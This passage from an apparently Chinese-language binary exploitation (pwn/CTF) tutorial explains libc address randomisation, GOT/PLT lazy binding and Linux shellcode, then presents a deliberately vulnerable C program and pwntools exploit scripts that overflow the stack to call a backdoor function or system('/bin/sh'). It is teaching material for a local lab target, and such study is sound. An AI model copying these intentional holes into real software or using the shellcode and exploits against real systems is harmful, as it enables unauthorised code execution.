        NX:       NX disabled
        PIE:      No PIE (0x8048000)
        RWX:      Has RWX segments
    root@mypwn:/ctf/work/MiniPWN# ldd vuln5
        linux-gate.so.1 (0xf76f4000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf750b000)
        /lib/ld-linux.so.2 (0xf76f5000)
    root@mypwn:/ctf/work/MiniPWN# ldd vuln5
        linux-gate.so.1 (0xf7794000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf75ab000)
        /lib/ld-linux.so.2 (0xf7795000)
可以看到每次运行的时候libc基地址都是变化的。
那么我们如何获取到Libc基地址,那么就只能通过运行中的程序泄漏,
或者gdb获取libc基地址修改程序流来达到目的了。
###  0x5.4 浅析Linux下程序装载SO共享库机制
刚开始学PWN的时候,学习到retlibc,其实还不是很理解一些got表,plt表的东西,也就只是按照大家的payload来使用了,下面让我们深入浅出来学习一番程序是如何调用libc里面的函数的。
关于这类型的文章google一大堆,这里我简要谈下一些关键的知识点。
**libc.so 是什么?**
libc.so 是linux下C语言库中的运行库glibc的动态链接版, 其中包含了大量可利用的函数。
**什么是动态链接(Dynamic linking)?**
动态链接是指在程序装载的时通过 **动态链接器**
将程序所需的所有动态链接库(so等)装载至进程空间中。当程序运行时才将他们链接在一起形成一个完整的程序,这样就比 **静态链接**
节约内存和磁盘空间,而且具有更高的扩展性。
动态链接库: Linux系统中ELF动态链接文件被称为 **动态分享对象(Dynamic Shared Objects)**
,也就是共享对象,一般以’.so’扩展名结尾,libc.so就是其中一个例子。window则是’.dll’之类的。
Linux编译共享文件命令:
`gcc got_extern.c -fPIC -shared -m32 -o my.so`
> -fPIC 选项是生成地址无关代码的代码，gcc 中还有另一个 -fpic
> 选项，差别是fPIC产生的代码较大但是跨平台性较强而fpic产生的代码较小，且生成速度更快但是在不同平台中会有限制。一般会采用fPIC选项  
>  地址无关代码的思想就是将指令分离出来放在数据部分。  
>  -shared 选项是生成共享对象文件  
>  -m32 选项是编译成32位程序  
>  -o 选项是定义输出文件的名称
**什么是延迟绑定(Lazy Binding)?**
因为如果程序一开始就将共享库所有函数都进行链接会浪费很多资源,因此采用了延迟绑定技术,函数需要用到的时候进行绑定,否则不绑定。
那么怎么实现绑定,用动态链接器,绑定什么呢,修改got表,怎么来延迟呢,利用plt表当作一个摆设然后重定位指向GOT表中真实的地址。
首先我们了解下什么是got表、什么是plt表,什么是动态链接器,以及三者的关系。
  * **GOT(Global offset Table) 全局偏移表**
存放函数真实的地址,能被动态链接器实时修改
GOT表被ELF拆分为.got 和
.got.plt表,其中`.got`表用来保存全局变量引用的地址,`.got.plt`用来保存函数引用的地址,外部函数的引用全部放在.got.plt中,我们主要研究也就是这部分。
先记住got表,第一项是`.dynamic`,第二项是`link_map`地址,第三项是`_dl_runtime_resolve()`,真正的外部函数地址是从第4项开始的也就是got[3]开始。
关于got表结构这部分,后面在高级ROP部分我会展开讲解。
  * **PLT(Procedure Link Table ) 程序连接表**
表项都是一小段代码,一一对应对应于got表中的函数。
    Dump of assembler code for function puts@plt:
       0x080482e0 :    jmp    DWORD PTR ds:0x804a00c
       0x080482e6 :    push   0x0
       0x080482eb :    jmp    0x80482d0
    End of assembler dump.
  * 程序加载plt的时候,会分为两种状态: 
    * 初始化的时候
plt中jmp跳转的got表取得的地址其实是plt的下一条指令, 0x080482e6
然后在继续往下执行到动态链接器函数`_dl_runtime_resolve`,把got表中函数重定向为libc中真实的地址。
  * 二次加载的时候
plt指向的直接got表表项的地址就是第一次重定向的真实地址。
两者的对应关系如下:
该内容更细可以参考: PWN之ELF解析
验证想法,我们可以手工进行调试一次
首先我们编译一个简单的程序2.c:
    gcc -g -no-pie -m32 -o test 2.c
    #include 
    int main(){
        puts("hello");
        puts("hello2");
        return 0;
    }
然后`gdb -r test`加载,`disassemble main`反编译main函数
**初始化的时候:**
这里就对got表进行了重定位修改为了真实地址。
**二次加载的时候:**
因为之前got表已经解析了puts的真实地址了,所以就直接指向了。
关于此部分比较细的调试过程参考文章:
[[原创][新手向]ret2dl-resolve详解](https://bbs.pediy.com/thread-227034.htm)
[PWN菜鸡入门之栈溢出 （2）——
ret2libc与动态链接库的关系](https://www.cnblogs.com/pwn2web/p/10352024.html)
这部分更多详细的内容推荐阅读>
## 0x6 Linux shellcode编写指南
关于shellcode的编写,网上也比较多了,这里简要介绍下一些原理和变形,如何工具实现自定义shellcode之类的内容。
最普通的shellcode:
大小端转换转换脚本
    >>> "".join(list('//bin/sh')[::-1]).encode('hex')
    '68732f6e69622f2f'
    xor    eax,eax
    push   eax
    push   0x68732f6e
    push   0x69622f2f ;//bin/sh
    mov    ebx,esp ;ebx为execve参数1
    push   eax ;eax 为参数
    mov    edx,esp ;edx赋值给edx
    push   ebx
    mov    al,0x0b ;execve 系统号
    int    0x80 ;触发系统中断,cpu切换到内核模式,执行系统调用
利用 pwntools,小白可以快速获取到shellcode
pwntools官方文档:
    # shellcode1
    print(shellcraft.i386.linux.sh())
限制了执行命令,可以采用一些原生的文件读取,然后进行输出,这主要是考察汇编的编程能力。
    print(shellcraft.i386.linux.readfile('/flag'))
我们就可以在工具的基础上,自己进行相应的改动了。
传输的时候是tcp流,所以我们发送的时候,要记得使用`asm`函数对shellcode进行编码
这部分内容更细可以参考:
[shellcode 的艺术](https://xz.aliyun.com/t/6645)
[生成可打印的shellcode](https://xz.aliyun.com/t/5662)
[Linux下shellcode的编写](https://xz.aliyun.com/t/2052)
## 0x7 前置题目基础知识
坑点:
> 1.scanf与gets区别  
>  我们平时遇的比较多应该都是gets,scanf很少用,所以很容易出现一些奇 怪的问题  
>  scanf 遇到缓冲区的空字符就会发生截断然后末尾s加上  
>  gets 则是遇到回车才截断然后加上  
>  **空字符: 空格 回车 制表 换行 空字符**
空字符 | 转义字符 | 意义 | ASCII值  
---|---|---|---  
空格 |  |  | decimal:32 0x20  
回车 | r |  | decimal:013 0x0d  
水平制表符 | t | 水平制表(HT) （跳到下一个TAB位置） | decimal: 009 0x09  
垂直制表符 | v |  | decimal: 011 0x0b  
换行 | n |  | decimal: 010 0x0a  
空字符 |  |  | decimal:000 0x00  
## 0x8 一道题总结PWN的栈利用方式
###  0x8.1 part1 题目源码
这个是我自己总结出的漏洞百出题目,很方便读者对照来学习各种栈溢出攻击技巧。
    #include 
    #include 
    //gcc -g -fno-stack-protector -z execstack -no-pie -z norelro  -m32 -o vuln 1.c
    char c[50];
    void SayHello()
    {
        char tmpName[10];
        char name[1024];
        puts("hello");
        scanf("%s", name);
        strcpy(tmpName, name);
    }
    void test(){
      system("cat /flag");
    }
    void fun(char a[]){
        printf("%s", a);
        printf("/bin/sh");
    }
    void bad(){
        gets(&c);
        puts(c);
    }
    int main(int argc, char** argv)
    {
        SayHello();
        return 0;
    }
编译方式:
这里的保护都没开,后面的一些技巧是可以避开保护的。
`gcc -g -fno-stack-protector -z execstack -no-pie -z norelro -m32 -o vuln8
1.c`
###  0x8.2 part2 问题分析
很明显这道题目是个经典的双栈溢出,分别是scanf和strcpy这两个危险函数没有限制输入,这里我主要从`strcpy`溢出点出发,谈谈各种获取shell的方法,以及小白很容易出现的问题。
IDA载入分析:
###  0x8.3 常见做法
####  0x8.3.1 直接替换返回地址为后门函数
这个比较简单直接给出exp,很明显test函数就是个后门函数。
条件:没开PIE,地址可以直接确定,学习pwntool的 ELF模块搜索功能。
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    context.log_level = 'debug'
    context(arch='i386', os='linux')
    # 设置tmux程序
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # program module
    io = process('./vuln8')
    elf = ELF('./vuln8')
    lib = ELF("/lib/i386-linux-gnu/libc.so.6")
    # backdoor 直接搜索后门函数地址
    vulndoor = elf.symbols['test']
    log.success("vulndoor:" + str(hex(vulndoor)))
    payload = 'A'*0x16 + p32(vulndoor)
    io.sendlineafter('hello', payload)
    io.interactive()
####  0x8.3.2 程序自带system函数
#####  0x8.3.2.1 程序自有/bin/sh字符串
这个题目依然是学习elf的search搜索字符串功能。
exp.py
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    context.log_level = 'debug'
    context(arch='i386', os='linux')
    # 设置tmux程序
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # program module
    io = process('./vuln8')
    elf = ELF('./vuln8')
    lib = ELF("/lib/i386-linux-gnu/libc.so.6")
    # system backdoor
    vulndoor = elf.symbols['system']
    # system argv /bin/sh
    binsh = elf.search("/bin/sh").next()
    log.success("vulndoor:" + str(hex(vulndoor)))
    log.success("/bin/sh: " + str(hex(binsh)))
    # 这个是函数返回的地址,这里没什么用
    retAddress = p32(0xdeadbeef)
    payload = 'A'*0x16 + p32(vulndoor) + retAddress + p32(binsh)
    io.sendlineafter('hello', payload)
    io.interactive()
#####  0x8.3.2.2 构造/bin/sh写入到bss段
为了方便学习我这里改动了一下主程序:
    #include 
    #include 
    //gcc -g -fno-stack-protector -z execstack -no-pie -z norelro  -m32 -o vuln 1.c
    char c[50];
    void SayHello()
    {